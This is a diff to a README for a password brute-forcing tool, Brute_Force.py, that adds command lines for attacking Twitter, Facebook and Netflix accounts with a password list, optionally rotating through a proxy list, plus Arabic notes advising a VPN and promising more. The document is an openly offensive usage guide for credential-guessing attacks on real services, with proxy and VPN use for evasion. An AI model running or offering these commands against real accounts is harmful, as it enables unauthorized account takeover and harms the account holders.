@@ -33,4 +33,25 @@ python3 Brute_Force.py -t Account@hotmail.com -p Password_Single
 
 ```bash
 python3 Brute_Force.py -T Account_Twitter -l File_list
+python3 Brute_Force.py -T Account_Twitter -l File_list -X proxy-list.txt
+
 ```
+# BruteForce Facebook Attack
+
+```bash
+python3 Brute_Force.py -f Account_facebook -l File_list
+python3 Brute_Force.py -f Account_facebook -l File_list -X proxy-list.txt
+```
+# BruteForce Netflix Attack
+
+```bash
+يفضل تشغيل VPN
+python3 Brute_Force.py -n Account_Netflix -l File_list
+python3 Brute_Force.py -n Account_Netflix -l File_list -X proxy-list.txt
+
+
+وترقبووو المزيد 
+```
+
+
+
